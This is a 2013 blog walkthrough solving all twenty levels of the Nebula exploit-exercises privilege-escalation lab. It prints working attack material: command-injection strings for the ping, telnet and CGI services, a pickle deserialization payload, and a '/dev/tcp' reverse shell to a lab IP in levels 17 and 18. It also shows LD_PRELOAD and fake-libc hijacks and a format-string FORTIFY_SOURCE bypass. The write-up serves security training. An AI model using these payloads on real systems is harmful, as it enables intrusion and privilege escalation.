---
categories:
- vulnhub
- walkthrough
- nebula
comments: false
date: "2013-03-30T22:46:33Z"
title: Nebula Solutions - All Levels
---

Nebula is the first of three exploit discs provided by [exploit exercises](http://exploit-exercises.com/).  I've seen a couple walkthroughs of these levels around, but as a completionist, and for future reference, I've cleaned my notes up a bit and am posting them here.  I will also post my notes for the other two systems sometime after.  This post includes a walkthrough of all 20 levels.

<h3>Level 00</h3>
Introduction level; requires the user to find a setuid file.  `find / -perm +6000 -type f -exec ls -ldh {} \; > files.txt` and `cat files.txt | grep flag00` gives us two files, `/bin/.../flag00` and `/rofs/bin/.../flag00`.  Pick one and get your flag.

<h3>Level 01</h3>
First "real" level.  A binary with an environmental vulnerability; the source code given clearly lays out that its loading the users environment, and running echo with a string.  By modifying our environmental PATH, we can "search" for echo first in another directory and launch a shell.  `export PATH=/tmp:$PATH` to search for binaries in /tmp first, then create a shell script that launches bash.  Flag captured.

<h3>Level 02</h3>
Much like the previous level, this involves the manipulation of environmental variables.  Here it's pulling `$USER` and inserting it into a string to echo out.  Because we control this variable, we can terminate the string and execute a shell with the following: `export USER="test && /bin/bash && echo"`.  Launch the binary and capture the flag.

<h3>Level 03</h3>
This level has a crontab that runs every 5 minutes, and executes anything found in the local `writable.d` folder, then removes it.  It, surprise, runs as our flag.  If we shove a malicious script into the run folder that generates a shell executable for us, we should be able to suid it and capture our flag.  Generate a shell script with the following in writable.d:

```
#!/bin/bash

gcc /tmp/shell.c -o /home/flag03/shell
chmod +s /home/flag03/shell
```
You'll just need to create `shell.c` in tmp and wait for it to run; I took the source code from level 1 and changed the system command to execute /bin/bash instead.  Execute `chmod +x` on run.sh and wait for your binary to be generated.  Once it is, execute it for your flag.  One thing to note is that it would be much easier to echo a shell script and suid that; alas, Linux prevents us from suid'ing scripts, [and for very good reason](http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html).

<h3>Level 04</h3>
Here we have another executable binary and a token file, which we must read.  The binary reads a name from stdin, checks if it's called "token" and if so, exits, otherwise it reads the file.  To circumvent this simple test, we can create a symbolic link to the token file and read that instead.  Executing `ln -s /home/flag04/token /tmp/test` allows us to then read /tmp/test and dump the token file.  In it is the password for flag04.

<h3>Level 05</h3>
This level aims to educate the user on directory permissions.  Browsing to `/home/flag05` and `ls -lAh` gives us several hidden folders, including a .backup folder with a tar file.  If we untar this, it appears to be a backup of flag05's ssh directory.  Copying the private key over will allow us to SSH in and capture our fifth flag.

<h3>Level 06</h3>
The informational page notes that this flag's credentials came from a legacy Unix system.  Executing `cat /etc/passwd | grep flag06` gives us a traditional DES encrypted password.  Loading this into john the ripper cracks the flag's password, giving us our sixth flag.

<h3>Level 07</h3>
Level 7 has a web server running on port 7007 that hosts a simple ping application.  No sanitation is performed on input, so obviously its prone to injection.  Leveraging the shell we wrote for level 3, we can simply generate a new shell script to compile and suid the binary.  By setting Host equal to `192.168.1.1 | sh /tmp/run2.sh`, we'll generate our shell and capture the flag.

<h3>Level 08</h3>
This level has a single pcap file with, likely. a password somewhere.  I scp'd this off so I could parse it in Wireshark, but it could also be done using `tcpdump -qns 0 -X -r capture.pcap | more`.  Opening the pcap gives us a login attempt with a password backdoor...00Rm8.ate.  The periods are represented by `\x7f`, which just so happens to be backspace.  su to flag08 and capture the flag.

<h3>Level 09</h3>
This level requires some prerequisite knowledge of PHP and an edge-case vulnerability.  When [pre_replace](http://php.net/manual/en/function.preg-replace.php) is used with the /e flag, the replacement string is substituted, evaluated, and replaced in the original string.  By looking at the PHP source code, we see the following `$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);`.  This regex matches the pattern `[email EMAIL]`, where EMAIL will be evaluated by the spam function, then eval'd by PHP.  Notice the function takes two arguments, but only uses one; a clue, by any means.  

In order to exploit this, we need to set the email portion of the regex to spawn us a shell.  This can be done with the following entry: `([email {${system($use_me)}}])`, where $use_me is $argv[2] to the executable.  Wrapping the command in `${system}` allows the PHP engine to interpret the command properly, and the extra pair of curly braces for escaping.  Pass in /bin/bash to capture your flag.

<h3>Level 10</h3>
Level 10 introduces a bit of networking; an application binary exists in the flag's folder, which reads a file and host from stdin and sends the file to the host over port 18211.  The binary first makes a call to access() to verify the user has adequate privileges; if not, a connection to the remote host is made and the file sent.  The vulnerability is a classic TOCTTOU (time of check to time of use); the application first checks if the user has access, then goes about creating a socket, making the connection, and sending the header.  With the following script, we can brute force the race condition:

```
#!/bin/bash

unlink /tmp/token
touch /tmp/token
/home/flag10/flag10 /tmp/token 192.168.1.74 &
rm -f /tmp/token
ln -s /home/flag10/token /tmp/token
```

I then started up a netcat listener on my remote host.  After about 30-40 iterations, I had flag 10's password.

<h3>Level 11</h3>
This is our first tricky level, I thought, that required a bit of leg work and thought.  The instructions state there are two ways to finish this level; I'm assuming that's through one of two code paths present in the binary.  Essentially if our content header is < 1024 we take the first transformation path, and if it's > 1024, we take the second.  The objective is to pass in already encrypted data that, when decrypted, can grab our flag.  If we send in encrypted data after a 1024 byte buffer, we can get decrypted commands to the system() call.  I wrote a small C application that runs the exact runtime from the given source and spits to stdout, which can then be piped to flag11 `./generate getflag | /home/flag11/flag11`.

<h3>Level 12</h3>
This level has a local telnet script listening on port 50001 that employs a lua script to handle all of its happenings.  The script accepts a password, hashes it, and checks it against a hard coded hash.  The vulnerability here is how it's actually verifying the password; the following line exemplifies the issue: `prog = io.popen("echo "..password.." | sha1sum", "r")`.  The listener receives input, and echo's it into sha1sum.  If we inject commands into our password, we should be able to snag the flag.  Executing `f | getflag > /tmp/test | echo "test"` as a password should result in our flag when you `cat /tmp/test`. 

<h3>Level 13</h3>
I was initially a little confused about the goal for this level; `cat /etc/passwd | grep 1000` returned the nebula account, which we "technically" don't know.  I then started looking for ways to preload a modified library, so we could override the getuid() call and just return 1000.  This led me [here](http://www.ibm.com/developerworks/library/l-glibc/index.html), which I was painlessly able to pull off:

```
level13@nebula: cat moduid.c
#include <unistd.h>
uid_t getuid(){ return 1000; }
level13@nebula: gcc -shared -o moduid.so moduid.c
level13@nebula: LD_PRELOAD=moduid.so ./flag13
```

Running this dumps our token to stdout.  Another method may be modifying the binary itself, but I don't know how legal that is.  This was a neat vulnerability, and something I haven't run into before.

<h3>Level 14</h3>
Now I'm convinced that running the binaries in a debugger is legal.  This level has a binary that only encrypts information; so, the objective here is to discover the encryption algorithm and write a complimentary decryption routine.  Playing around with the encryption tool allowed me to quickly discover what it was doing, without having to delve into assembly:

```
abcdefg -> acegikm
a -> a (idx + 0)
b -> c (idx + 1)
c -> e (idx + 2)
d -> g (idx + 3)
e -> i (idx + 4)
f -> k (idx + 5)
g -> m (idx + 6)
```

So to reverse this, we just need to subtract the index.  I wrote a quick python script for doing this:

```
import sys

def decrypt(args):
    ciph = args[2]
    plain = ''
    print 'Decrypting ', ciph
    for idx in xrange(len(ciph)):
        tmp = (ord(ciph[idx])-65)-idx
        plain += chr(tmp+65)
    print 'Decrypted: ', plain

def encrypt(args):
    plain = args[2]
    ciph = ''
    print 'Encrypting ', plain
    for idx in xrange(len(plain)):
        tmp = (ord(plain[idx])-65)+idx
        ciph += chr(tmp+65)
    print 'Encrypted: ', ciph

if len(sys.argv) < 2:
    print '%s: [-d] [cipher] [-e] [plain]'%sys.argv[0]
    sys.exit(1)

if '-d' in sys.argv:
    decrypt(sys.argv)
elif '-e' in sys.argv:
    encrypt(sys.argv)
```

Now we just need to pass in the output of the encrypted token file to obtain our flag.

<h3>Level 15</h3>
If we strace flag15, we see a ton of access attempts to libc.so.6 in various folders in `/var/tmp/flag15`.  My first idea was to forgo the libc loading stuff and try wrapping the puts call and use the preload vulnerability again:

```
level15@nebula:/tmp$ cat wrapper.c
#include <unistd.h>

int __wrap_puts(const char *s){
    system("/bin/getflag > /tmp/flagged");
    return puts(s);
}
level15@nebula:/tmp$ gcc -Wl,-wrap,write -shared -o /tmp/wrapper.so /tmp/wrapper.c
level15@nebula:/tmp$ LD_PRELOAD=/tmp/wrapper.so ./flag15
```

Unfortunately, the protection mechanism for preloading libraries catches us.  The loader will completely ignore the preloaded library if the RUID is not equal to the EUID and unlike level 13, we need to execute a binary, not simply obtain a token embedded in the binary.

So instead we need to compile a statically linked library and get it to call that library with whatever function it's using.  Object dumping the file, we find our main quite small:

```
level15@nebula:/home/flag15$ objdump -d -M intel flag15 
[....]
08048330 <main>:
 8048330:  55                     push   %ebp
 8048331:  89 e5                  mov    %esp,%ebp
 8048333:  83 e4 f0               and    $0xfffffff0,%esp
 8048336:  83 ec 10               sub    $0x10,%esp
 8048339:  c7 04 24 d0 84 04 08   movl   $0x80484d0,(%esp)
 8048340:  e8 bb ff ff ff         call   8048300 <puts@plt>
 8048345:  c9                     leave  
 8048346:  c3                     ret    
 8048347:  90                     nop
```

The only function it calls is puts, so we need to override that; we also need a target location.  `/var/tmp/flag15/libc.so.6` appears to be the least nested.  Here's the library code:

```
level15@nebula:/home/flag15$ cat /tmp/lib.c
#include <stdio.h>
#include <stdlib.h>

int puts(const char *s){
  system("/bin/getflag > /tmp/flagged");
}

int __libc_start_main(int (*main)(int, char **, char **), 
           int argc, char **argv,
          void (*init)(void),
          void (*fini)(void),
          void (*rtld_fini)(void),
          void (*stack_end))
    { main(argc, argv, NULL);
  return 0;
}
level15@nebula:/home/flag15$ 
```

We just need to compile and statically link this to the library path:

```
level15@nebula:/home/flag15$ gcc -Wall -fPIC -o /tmp/libc.o -c /tmp/lib.c
/tmp/lib.c: In function ‘puts’:
/tmp/lib.c:6:1: warning: control reaches end of non-void function [-Wreturn-type]
level15@nebula:/home/flag15$ gcc -shared -W1,-Bstatic,-soname,libc.so.6 -o /var/tmp/flag15/libc.so.6 /tmp/libc.o -static
level15@nebula:/home/flag15$ ./flag15
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __deregister_frame_info, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

This, [apparently](http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker), means that the library version number is lower on the shared object.  So we'll need to generate a version file and link it in:

```
level15@nebula:/home/flag15$ cat /tmp/versionz 
GLIBC_2.0{
  __cxa_finalize;
  __libc_start_main;
  puts;
};
GLIBC_2.1.3 {
}GLIBC_2.0;

GLIBC_2.4{
}GLIBC_2.0;
level15@nebula:/home/flag15$ 
```

Recompile with --version-script=/tmp/versionz and...

```
level15@nebula:/home/flag15$ ./flag15
Segmentation fault
level15@nebula:/home/flag15$ cat /tmp/flagged
You have successfully executed getflag on a target account
level15@nebula:/home/flag15$
```

<h3>Level 16</h3>
Level 16 has an HTTP server that hosts a simple CGI script.  In it, it parses off two parameters (username & password) from the URL, then the username is converted to uppercase and everything after a space is stripped.  It then uses it as an argument to egrep:

```
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
```

This level took a bit of thought and a frustrating amount of tinkering; it's obvious where the vulnerability is, but it's not so obvious what we actually need to do.  All input is run through the two filters, so we'll need to either send in post-manipulated data that will be changed back when run, or some other voodoo that'll correctly be interpreted by bash and not touched by the filters.

The easiest, and shortest, command will be a script.  Normally, you wouldn't have access to the underlying host, but we do, so for now we'll take advantage of it.  I"ll admit I spent more time Googling around for this one than any of the previous; I happened to stumble into [this](http://serverfault.com/questions/221318/bash-wildcard-expansion) Stack Overflow post about bash wildcard expansion:

```
level16@nebula:~$ pwd
/tmp
level16@nebula:~$ ls
SHELL
level16@nebula:~$ ls /*/SHELL
/tmp/SHELL
```

Wildcards aren't anything new, but I never knew that you could use it as such.  This means we need to have our username evaluated as `/*/shell`, so when it's expanded it'll be `/tmp/SHELL`.  The final result:

```
http://192.168.1.206:1616/index.cgi?username=%22%60%2f*%2fshell%60%22&password=dolphin
```

Add in a netcat call back to a script SHELL in tmp (see level 17) and it's game over.

<h3>Level 17</h3>
This level is yet another vulnerable listener, this time implemented in Python.  The vulnerability lies in the Pickle module, where one look at documentation gets you:

```
Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
```

Because our input is never sanitized, we just need to send a specially crafted input string to be unpickled and execute malicious code.  [This](http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf) Blackhat whitepaper came in handy when figuring out how the parsing engine worked, and once I had that figured out it was pretty easy:

```
import socket

cmd = "cos\nsystem\n(S'/bin/bash -i > /dev/tcp/192.168.1.74/5555 0>&1'\ntR.\n"
try:
    sock = socket.socket()
    sock.connect(('192.168.1.206', 10007))
    data = sock.recv(512)
    print 'Got: ', data
    sock.send(cmd)
    sock.close()
except Exception, e: print e
```

I had a netcat shell listening on port 5555 for the call back.  I used this method because the Nebula box doesn't have netcat-traditional on it, which lacks the -e flag.  This is a neat way of opening a reverse shell without the fuss of named pipes.

<h3>Level 18</h3>
According to the level documentation, this can be completed in three different ways at three different difficulty levels.  The binary appears to be a hackney attempt at some sort of login program; with it, a user can "login" to elevate privileges, set user, do some debugging, and some other smaller things.  Immediately though I see a buffer overflow:

```
level18@nebula:/home/flag18$ ./flag18
setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** buffer overflow detected ***: ./flag18 terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xdbd8d5]
/lib/i386-linux-gnu/libc.so.6(+0xe66d7)[0xdbc6d7]
/lib/i386-linux-gnu/libc.so.6(+0xe5d35)[0xdbbd35]
/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x91)[0xd41f91]
/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x31d5)[0xd19305]
/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xc9)[0xdbbe09]
/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xdbbd1f]
./flag18[0x8048df5]
./flag18[0x8048b1b]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xcef113]
./flag18[0x8048bb1]
======= Memory map: ========
00324000-00325000 r-xp 00000000 00:00 0          [vdso]
00358000-00376000 r-xp 00000000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
00376000-00377000 r--p 0001d000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
00377000-00378000 rw-p 0001e000 07:00 44978      /lib/i386-linux-gnu/ld-2.13.so
00c9b000-00cb7000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
00cb7000-00cb8000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
00cb8000-00cb9000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
00cd6000-00e4c000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00e4c000-00e4e000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00e4e000-00e4f000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
00e4f000-00e52000 rw-p 00000000 00:00 0 
08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
082c5000-082e6000 rw-p 00000000 00:00 0          [heap]
b77a8000-b77a9000 rw-p 00000000 00:00 0 
b77b1000-b77b4000 rw-p 00000000 00:00 0 
bfabf000-bfae0000 rw-p 00000000 00:00 0          [stack]
Aborted
level18@nebula:/home/flag18$ 
```

I guess not.  It appears it's been compiled with a bit of protection:

```
level18@nebula:/home/flag18$ ./checksec.sh --file flag18
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   flag18
level18@nebula:/home/flag18$ 
```

On deeper inspection of the code, it appears there are several logic flaws that could allow simple execution of a root shell.

The first issue is that there's no restriction on what file we're debugging to, so long as we've got the privileges required to open it.  In this case, this means we can debug to the same file that we're checking passwords against.  Since we can't actually read the file, we need to infer:

```
level18@nebula:/home/flag18$ ./flag18 -d /home/flag18/password 
^Clevel18@nebula:/home/flag18$ ls -lh password
-rw------- 1 flag18 flag18 31 2013-03-20 00:38 password
level18@nebula:/home/flag18$ echo Starting up. Verbose level = 0 | wc -c
31
level18@nebula:/home/flag18$ 
```

So we read without error and we know the exact data in the file.  The problem with this is that it strips newlines, and with fgets we don't have a nice way of inserting them.  

The second issue I discovered involved the command site exec, which doesn't properly format output, and won't append newlines (which may be used to further the first issue).

```
level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg 
site exec %n
*** %n in writable segment detected ***
Aborted
level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg 
site exec %4$x
*** invalid %N$ use detected ***
Aborted
level18@nebula:/home/flag18$
```

This means that our binary was likely compiled with [FORTIFY_SOURCE=2](https://wiki.edubuntu.org/ToolChain/CompilerFlags).  [Here's](http://gcc.gnu.org/ml/gcc-patches/2004-09/msg02055.html) the patch that explains what it is and prevents, and the differences between 1 and 2.  Because I don't take doors slammed in my face very well, and it's late, it's time to break out the [phrack](http://www.phrack.org/issues.html?issue=67&id=9):

```
level18@nebula:/home/flag18$ gdb ./flag18 
Reading symbols from /home/flag18/flag18...(no debugging symbols found)...done.
(gdb) r -d /tmp/dbg 
Starting program: /home/flag18/flag18 -d /tmp/dbg
site exec %1$*269168516$x %1073741824$                            

Program received signal SIGSEGV, Segmentation fault.
0x0028b359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) 
```

Exploitation of this wasn't trivial, but it was eye-opening into some of the things you can accomplish with format string vulnerabilities.  Because our binary was compiled with FORTIFY_SOURCE, there are essentially two things we need to do: disable the FORTIFY flag, and disable the argument filler.  The argument filler essentially sets every argument in arguments[argc] to -1, then fills in the user supplied arguments.  Any -1's remaining will cause an error.  At a high level we're doing this:
+ Disable FORTIFY_SOURCE flag
+ Modify nargs to blow up
+ Be happy

The Phrack article does a better job of explaining this than I do, so if you'd like an in-depth analysis of all this, follow the article.  Anyway -- finding and disabling FORTIFY_SOURCE:

```
level18@nebula:/home/flag18$ gdb ./flag18 
Reading symbols from /home/flag18/flag18...(no debugging symbols found)...done.
(gdb) b vfprintf
Function "vfprintf" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 1 (vfprintf) pending.
(gdb) r -d /tmp/dbg
site exec %1$*2222848$x %1073741824$

Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) c
Continuing.

Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) tb *(vfprintf+4649)
Temporary breakpoint 2 at 0x172359
(gdb) c
Continuing.

Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/x $eax
0xbfffef60:    0xfbad8004
(gdb) x/20wx $eax
0xbfffef60:    0xfbad8004    0xbffff4f8    0x0017192c    0xbffff528
0xbfffef70:    0xbfffcf60    0xbfffcf60    0xbfffef60    0x00000000
0xbfffef80:    0x00000000    0x00000000    0x00000027    0x08049017
0xbfffef90:    0xfbad8004    0x00000000    0x00000000    0x00000004
0xbfffefa0:    0xbfffcf90    0xbf00cfaf    0x00000000    0x00000000
(gdb) x/wx 0xbfffef9c
0xbfffef9c:    0x00000004
(gdb) 
```

There's obviously a bit of cheating here, but bare with me: we're essentially breaking on vfprintf, which receives a file pointer, a formatter, and an argument list.  We then take a peek at the stack, note our file pointer, and find the flag inside (0x000000004).  We know need to calculate the offset:

```
(gdb) x/wx 0xbfffef9c
0xbfffef9c:    0x00000004
(gdb) p/d ((0xbfffef9c-$ecx)&0xffffffff)/4
$1 = 2847
(gdb)
```

And accounting for off-by-one, it's 2848.  So:

```
(gdb) r -d /tmp/dbg
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/flag18/flag18 -d /tmp/dbg
site exec %1$*2848$x %1073741824$

Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) tb *(vfprintf+4649)
Temporary breakpoint 4 at 0x172359
(gdb) c
Continuing.

Temporary breakpoint 4, 0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/i $eip
=> 0x172359 <vfprintf+4649>:    mov    DWORD PTR [edx+eax*4],0x0
(gdb) x/wx $ecx+$eax*4
0xbfffef9c:    0x00000004
(gdb)
```

Great, we've got the correct value for clobbering that flag.  Now we need to find the offset for clobbering nargs:

```
(gdb) find 0xbfff0000, 0xbffffff0, 0xdeadbeef
0xbfff5568
0xbfff59ec
2 patterns found.
(gdb) -r 
Starting program: /home/flag18/flag18 -d /tmp/dbg
site exec %1$*283434$x %1073741824$

Program received signal SIGSEGV, Segmentation fault.
0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) p/d (0xbfff5568-$ecx)/4 + 1
$6 = 479
(gdb) 
```

I got stuck here for awhile, and after some googling I discovered someone had already solved this level this way!  So I took [his](http://v0ids3curity.blogspot.com/2012/09/exploit-exercise-format-string.html) advice and created an environmental variable that would lower the stack address and not segfault.  The final phase is now upon us; smuggling shellcode in.  The Phrack article gets a little hairy at this point, so instead of screwing around with adjusting stack offsets, I decided to just take the route that v0id took in his blog post.  His process involves setting the loggedin variable by way of taking control of uninitialized stack memory, thanks to [Rosenburg's](http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/) fantastic post on this topic:

```
site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$

Program received signal SIGSEGV, Segmentation fault.
0x00d7af00 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) i r
eax            0x41414141    1094795585
ecx            0x0    0
edx            0x1    1
ebx            0xeafff4    15400948
esp            0xbfdb8b9c    0xbfdb8b9c
ebp            0xbfdb97e8    0xbfdb97e8
esi            0xbfdbb810    -1076119536
edi            0xbfdb8bc0    -1076130880
eip            0xd7af00    0xd7af00 <vfprintf+11728>
eflags         0x10246    [ PF ZF IF RF ]
cs             0x73    115
ss             0x7b    123
ds             0x7b    123
es             0x7b    123
fs             0x0    0
gs             0x33    51
(gdb)
```

So we just need to find the loggedin variable, then call shell on it:

```
(gdb) x/2i $eip
=> 0x8048928 <main+376>:    cmp    DWORD PTR ds:0x804b0b4,0x1
   0x804892f <main+383>:    jle    0x804894d <main+413>
(gdb) x/x 0x804b0b4
0x804b0b0 <globals+4>:    0x00000000
```

Stick that into our LD_PRELOAD, sprinkle in a bit of stack alignment, and...

```
level18@nebula:/home/flag18$ export LD_PRELOAD=`python -c 'print "\xb4\xb0\x04\x08"*8000'`
level18@nebula:/home/flag18$ gdb ./flag18
(gdb) r -d /tmp/dbg
site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
shell
./flag18: -d: invalid option
Usage:    ./flag18 [GNU long option] [option] ...
    ./flag18 [GNU long option] [option] script-file ...
GNU long options:
    --debug
    --debugger
    --dump-po-strings
    --dump-strings
    --help
    --init-file
    --login
    --noediting
    --noprofile
    --norc
    --posix
    --protected
    --rcfile
    --restricted
    --verbose
    --version
Shell options:
    -irsD or -c command or -O shopt_option        (invocation only)
    -abefhkmnptuvxBCHP or -o option
level18@nebula:/home/flag18$ 
```

Success!  It's clearly passing in the -d flag to sh, so...

```
level18@nebula:/home/flag18$ ./flag18 --rcfile -d /tmp/dbg
site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
shell
/tmp/dbg: line 1: Starting: command not found
/tmp/dbg: line 2: syntax error near unexpected token `||'
/tmp/dbg: line 2: `|| %134525108%-1274542928 %'
level18@nebula:/home/flag18$ cat /tmp/Starting
#!/bin/bash
/bin/bash -i > /dev/tcp/192.168.1.74/5555 0>&1
level18@nebula:/home/flag18$ export PATH=/tmp:$PATH
level18@nebula:/home/flag18$ ./flag18 --rcfile -d /tmp/dbg
site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
shell
flag18@nebula:/home/flag18$ 
```

A shell was waiting for me on 192.168.1.74:5555.  Lots of subtle intricacies here, but really quite fun.

The third issue is the following snippet:

```
26  fp = fopen(PWFILE, "r");
 27  if(fp) {
 28    char file[64];
 29
 30    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
 31      dprintf("Unable to read password file %s\n", PWFILE);
 32      return;
 33    }
 34                fclose(fp);
 35    if(strcmp(pw, file) != 0) return;    
 36  }
 37  dprintf("logged in successfully (with%s password file)\n", 
 38    fp == NULL ? "out" : "");
 39  
 40  globals.loggedin = 1;
```

If the application fails to read PWFILE, the flow will automatically assume the user is logged in.  This appears to be either the easy or intermediate way, as source code explicitly calls this case out (with%s password file).  This could be defeated by opening up a ton of files and running the binary, effectively erroring out fopen and getting the loggedin flag set.

<h3>Level 19</h3>
We now arrive at the final level of Nebula.  This level checks the owner of the calling process and, if root, pops a shell.  This level was kinda neat because it requires you to have an understanding of how forking and parent/child processing works; and if you know that, it's pretty easy.  In this level we're going to exploit an [orphan process](http://www.geekride.com/orphan-zombie-process/) and its reclamation process.  When a parent of a child process terminates, the child process stays alive and becomes an orphan process.  This orphan process is automatically reclaimed by an init process:

```
Parent generates child process:
            -- child
           /
parent ---/

Parent dies:
        -- child
       X
x ----/

init process discovers child and adopts:
         -- child
        /
init---/
```

So we want to fork off a process and kill the parent before it calls flag19.  Then, when it goes to stat the process, it will stat init instead of us thereby assuming the role of root.  Here's the code for achieving that:

```
#include <stdlib.h>

void main(void){
    pid_t pid;
    char cmd[]   = "/home/flag19/flag19";
    char *argv[] = {"/bin/sh", "-c", "/bin/getflag > /tmp/flagged"};

    switch( pid = fork() ){
        case -1:
            perror("failed to fork\n");
        case 0:
            // execute command when parent dies
            sleep(2);
            execvp(cmd, argv);
        default:
            sleep(1); // wait a sec
            exit(1); // ok kill parent
        }
}
```

And flag was waiting for us in `/tmp/flagged`.
